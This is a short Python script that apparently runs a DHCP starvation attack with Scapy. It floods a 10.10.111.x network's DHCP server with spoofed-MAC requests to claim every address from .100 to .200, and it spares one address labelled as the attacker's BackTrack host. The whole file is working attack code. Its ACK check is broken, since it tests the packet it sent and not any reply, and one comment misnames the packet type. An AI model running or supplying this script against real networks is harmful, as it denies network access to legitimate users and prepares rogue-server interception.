from scapy.all import*
import time
from time import sleep


starved= []
for i in range(100,201):
	dest_ip = ("10.10.111.%d")%(i) #looping targeting addresses from 10.10.111.100 - 10.10.111.200	
	if dest_ip not in starved:
		dhcp_request = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")/IP (src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=RandString(12, '0123456789abcdef'))/DHCP(options=[("message-type","request"), ("requested_addr",dest_ip),("lease_time", 86400), ("server_id","10.10.111.1"),"end"]) #sending DHCP Discover packets to the router
		sendp(dhcp_request)
		print dest_ip, "Starved"
		sleep(1.0) 				#Delay of 1 sec is introduced for the Router to process smoothly.
		if dhcp_request[DHCP]:			# waiting for DHCP ACK, if received add targeted IP to starved pool.
			if dest_ip != "10.10.111.107":  # Targeted address 10.10.111.107 is excluded because it is the IP of BT5
				starved.append(dest_ip)
				print "Registered"
		else:				# If ACK not received send a DHCP Request Packet again.
			sendp(dhcp_request)
print "The starved IPs are:"
print starved



